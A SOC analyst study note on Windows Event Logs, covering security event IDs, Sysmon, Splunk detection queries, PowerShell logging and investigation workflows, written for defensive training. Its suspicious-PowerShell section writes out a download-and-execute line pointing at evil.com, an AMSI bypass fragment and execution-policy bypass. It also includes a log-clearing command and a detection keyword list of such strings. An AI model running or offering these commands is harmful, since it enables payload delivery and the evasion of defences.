---
{"dg-publish":true,"dg-home":null,"permalink":"/soc-l1-complete-knowledge-base/03-windows/windows-event-logs/","dgPassFrontmatter":true}
---

# Windows Event Logs
#Windows #Logs #SIEM #Detection #EventIDs

---

## Overview

Windows Event Logs are the primary source of security telemetry from Windows endpoints. Every authentication, process, policy change, and system event is logged here. Mastering Event IDs is one of the most critical SOC L1 skills.

**Why it matters in real SOC:** Windows Event Logs feed your SIEM with endpoint telemetry. Threat actors leave traces in these logs even when using Living-off-the-Land (LotL) techniques.

---

## Log Locations

```
C:\Windows\System32\winevt\Logs\
├── Security.evtx       ← Most important for SOC
├── System.evtx         ← Services, drivers, OS events
├── Application.evtx    ← App-level events
├── Microsoft-Windows-PowerShell%4Operational.evtx  ← PowerShell activity
├── Microsoft-Windows-Sysmon%4Operational.evtx      ← Sysmon (if installed)
├── Microsoft-Windows-TaskScheduler%4Operational.evtx ← Scheduled tasks
└── Microsoft-Windows-WMI-Activity%4Operational.evtx  ← WMI activity
```

---

## Critical Event IDs — Security Log

### Authentication Events

| Event ID | Description | SOC Relevance |
|----------|------------|---------------|
| **4624** | Successful logon | Baseline, monitor for unusual logon types |
| **4625** | Failed logon | Brute force detection |
| **4634** | Logoff | Session duration analysis |
| **4648** | Logon using explicit credentials | Pass-the-hash, lateral movement |
| **4672** | Special privileges assigned at logon | Admin logon |
| **4768** | Kerberos TGT requested | Kerberoasting precursor |
| **4769** | Kerberos service ticket requested | Kerberoasting |
| **4771** | Kerberos pre-auth failed | Brute force |
| **4776** | NTLM authentication attempt | Pass-the-hash indicator |

**Logon Types (Critical to Know):**

| Type | Name | Description | Attack Context |
|------|------|-------------|----------------|
| 2 | Interactive | Local console login | Normal admin |
| 3 | Network | Net share, mapped drive | Lateral movement |
| 4 | Batch | Scheduled task | Persistence |
| 5 | Service | Service account | Malicious service |
| 7 | Unlock | Screen unlock | Normal |
| 8 | NetworkCleartext | Auth with cleartext creds | Credential exposure |
| 9 | NewCredentials | runas /netonly | Pass-the-hash |
| 10 | RemoteInteractive | RDP | Remote access |
| 11 | CachedInteractive | Offline cached creds | Normal offline |

**Detection Query - Brute Force:**
```spl
index=wineventlog EventCode=4625
| stats count by src_ip, TargetUserName, WorkstationName
| where count > 10
| sort -count
```

**Detection Query - Pass-the-Hash (Logon Type 3 + NTLM):**
```spl
index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package="NTLM"
| where TargetUserName!="ANONYMOUS LOGON"
| table _time, src_ip, TargetUserName, WorkstationName
```

---

### Account Management Events

| Event ID | Description | SOC Relevance |
|----------|------------|---------------|
| **4720** | User account created | Unauthorized account creation |
| **4722** | User account enabled | Reactivating dormant accounts |
| **4724** | Password reset attempt | Credential manipulation |
| **4728** | Member added to security group | Privilege escalation |
| **4732** | Member added to local group | Local privilege escalation |
| **4756** | Member added to universal group | AD privilege escalation |
| **4738** | User account changed | Account modification |
| **4740** | User account locked out | Brute force result |
| **4767** | User account unlocked | After lockout (possible attacker success) |

**Critical Monitored Groups:**
- Domain Admins (S-1-5-21-...-512)
- Enterprise Admins (S-1-5-21-...-519)
- Schema Admins (S-1-5-21-...-518)
- Administrators (S-1-5-32-544)
- Remote Desktop Users

**Detection Query - Privileged Group Modification:**
```spl
index=wineventlog EventCode IN (4728,4732,4756)
| search GroupName IN ("Domain Admins","Enterprise Admins","Administrators")
| table _time, SubjectUserName, MemberName, GroupName, Computer
```

---

### Process Events (Requires Audit Process Creation)

| Event ID | Description | SOC Relevance |
|----------|------------|---------------|
| **4688** | New process created | Command line logging (if enabled) |
| **4689** | Process exited | |

**CRITICAL:** Enable "Include command line in process creation events" via GPO. Without this, 4688 is nearly useless.

**Suspicious parent-child process chains:**
```
winword.exe → cmd.exe           ← Phishing macro execution
excel.exe → powershell.exe      ← Phishing macro execution
outlook.exe → wscript.exe       ← Phishing attachment execution
iexplore.exe → cmd.exe          ← Browser exploit
svchost.exe → cmd.exe           ← Service exploitation
lsass.exe → *                   ← Rarely spawns children, suspicious if it does
```

**Detection Query:**
```spl
index=wineventlog EventCode=4688 
| where Creator_Process_Name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
AND New_Process_Name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","regsvr32.exe")
| table _time, Computer, SubjectUserName, Creator_Process_Name, New_Process_Name, Process_Command_Line
```

---

### Policy Change Events

| Event ID | Description | SOC Relevance |
|----------|------------|---------------|
| **4698** | Scheduled task created | Persistence |
| **4699** | Scheduled task deleted | Anti-forensics |
| **4702** | Scheduled task updated | Persistence modification |
| **4704** | User right assigned | Privilege escalation |
| **4719** | System audit policy changed | Defense evasion |
| **4907** | Object SACL changed | Defense evasion |

---

### Object Access Events

| Event ID | Description | SOC Relevance |
|----------|------------|---------------|
| **4663** | Object access attempt | File access monitoring |
| **4656** | Handle to object requested | |
| **5140** | Network share accessed | Data exfil via share |
| **5145** | Network share object access | Detailed share access |

---

## Sysmon Event IDs (Essential for Production SOC)

**Sysmon** (System Monitor) is a free Microsoft Sysinternals tool that dramatically enhances Windows logging. **Always push for Sysmon deployment in your SOC.**

Install: `sysmon64.exe -accepteula -i sysmonconfig.xml`

| Event ID | Description | Key Fields |
|----------|------------|-----------|
| **1** | Process creation | Image, CommandLine, ParentImage, Hashes |
| **2** | File creation time changed | Anti-forensics indicator |
| **3** | Network connection | src/dest IP, port, Process |
| **5** | Process terminated | |
| **6** | Driver loaded | SignatureStatus |
| **7** | Image loaded (DLL) | Signed, SignatureStatus |
| **8** | CreateRemoteThread | Thread injection |
| **10** | ProcessAccess (lsass) | GrantedAccess (Mimikatz) |
| **11** | File created | TargetFilename |
| **12/13/14** | Registry create/modify/delete | TargetObject |
| **15** | File stream created | ADS creation |
| **17/18** | Pipe created/connected | Named pipe activity |
| **22** | DNS query | QueryName, QueryResults |
| **25** | Process tampering | |

**Golden Sysmon Rules:**

**Mimikatz Detection (lsass access):**
```spl
index=sysmon EventCode=10 
TargetImage="C:\\Windows\\System32\\lsass.exe"
| eval suspicious=if(match(GrantedAccess,"0x1010|0x1410|0x147a|0x1418|0x40|0x1438"),1,0)
| where suspicious=1
| table _time, Computer, SourceImage, GrantedAccess, CallTrace
```

**C2 Beaconing Detection (DNS):**
```spl
index=sysmon EventCode=22
| stats count dc(QueryName) as unique_domains by Image, Computer
| where count > 100 AND unique_domains < 5
| sort -count
```

**Persistence via Registry:**
```spl
index=sysmon EventCode=13 
TargetObject IN (
  "*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run*",
  "*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce*",
  "*\\SYSTEM\\CurrentControlSet\\Services*"
)
| table _time, Computer, User, Image, TargetObject, Details
```

---

## PowerShell Logging Events

| Event ID | Location | Description |
|----------|----------|-------------|
| **4103** | PowerShell/Operational | Module logging |
| **4104** | PowerShell/Operational | **Script block logging** ← Most valuable |
| **4105** | PowerShell/Operational | Script block start |
| **400** | Windows PowerShell | Engine state change |

**Enable Script Block Logging via GPO:**
```
Computer Configuration → Administrative Templates → 
Windows Components → Windows PowerShell → 
Turn on PowerShell Script Block Logging = Enabled
```

**Suspicious PowerShell Patterns:**
```powershell
# Encoded command (obfuscation)
powershell.exe -EncodedCommand [base64string]

# Download and execute (dropper)
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Hidden window (hiding execution)
powershell.exe -WindowStyle Hidden -NonInteractive

# AMSI bypass attempt
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

**Detection Query - Malicious PowerShell:**
```spl
index=wineventlog EventCode=4104
| search ScriptBlockText IN ("*IEX*","*Invoke-Expression*","*DownloadString*","*WebClient*","*EncodedCommand*","*AmsiUtils*","*bypass*")
| table _time, Computer, UserID, ScriptBlockText
```

---

## Windows Commands for Log Analysis

### Event Viewer (GUI)
```cmd
eventvwr.msc
```
Navigate to: Windows Logs → Security / System / Application

### wevtutil (Command Line)
```cmd
# Query recent security events
wevtutil qe Security /c:100 /rd:true /f:text

# Query specific Event ID
wevtutil qe Security "/q:*[System[(EventID=4625)]]" /c:50 /f:text

# Export logs to evtx file
wevtutil epl Security C:\logs\security_export.evtx

# Get log info
wevtutil gl Security

# Clear log (attackers use this - detect via Event ID 1102)
wevtutil cl Security
```

### PowerShell - Get-WinEvent
```powershell
# Get last 100 Security events
Get-WinEvent -LogName Security -MaxEvents 100

# Filter by Event ID
Get-WinEvent -LogName Security -FilterHashtable @{Id=4625} | Select-Object -First 50

# Filter by time range
Get-WinEvent -LogName Security -FilterHashtable @{
    StartTime = (Get-Date).AddHours(-24)
    EndTime = Get-Date
    Id = 4624
}

# Search for keyword in message
Get-WinEvent -LogName Security | Where-Object {$_.Message -like "*administrator*"}

# Export to CSV
Get-WinEvent -LogName Security -FilterHashtable @{Id=4625} | 
    Select-Object TimeCreated, Id, Message | 
    Export-Csv -Path C:\logs\failed_logins.csv -NoTypeInformation

# Query remote machine
Get-WinEvent -ComputerName server01 -LogName Security -MaxEvents 100

# Parse XML for specific fields
Get-WinEvent -LogName Security -FilterHashtable @{Id=4624} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
        LogonType = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | Select-Object -ExpandProperty '#text'
        SourceIP = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'
    }
}
```

---

## Investigation Workflows

### Brute Force Investigation
```
1. Alert: Multiple 4625 from same source IP
2. Check: How many failed attempts? Against which account?
3. Check: Was 4624 (success) ever generated from this IP?
4. Check: What time window? (business hours vs 2 AM)
5. Enrich: AbuseIPDB lookup on source IP
6. Enrich: Is the target account a privileged account?
7. Check: Account status after - was it locked? (4740)
8. If success occurred → escalate, contain, investigate affected system
```

### Suspicious Account Creation Investigation
```
1. Alert: 4720 from non-IT account or non-standard time
2. Check: Who created it? (SubjectUserName)
3. Check: What account was created? Naming convention?
4. Check: Was it added to privileged groups? (4728/4732)
5. Check: Was it logged into? (4624 with new account)
6. Correlate: What was SubjectUserName doing before/after?
7. Escalate if: Created by non-admin, added to privileged group, logged in quickly
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Event IDs |
|-----------|----|----|
| Valid Accounts | T1078 | 4624, 4625, 4648 |
| Pass the Hash | T1550.002 | 4624 (Type 3, NTLM) |
| Kerberoasting | T1558.003 | 4769 |
| Scheduled Task | T1053.005 | 4698, 4702 |
| Create Account | T1136 | 4720 |
| Modify Groups | T1098 | 4728, 4732 |
| OS Credential Dumping | T1003 | Sysmon 10 on lsass |
| PowerShell | T1059.001 | 4104, Sysmon 1 |
| Defense Evasion - Clear Logs | T1070.001 | 1102, 104 |

---

## Related Notes
- [[Sysmon Deep Dive\|Sysmon Deep Dive]]
- [[PowerShell Detection\|PowerShell Detection]]
- [[SIEM Overview\|SIEM Overview]]
- [[Windows Commands Reference\|Windows Commands Reference]]
- [[Brute Force Playbook\|Brute Force Playbook]]
- [[Privilege Escalation Detection Playbook\|Privilege Escalation Detection Playbook]]
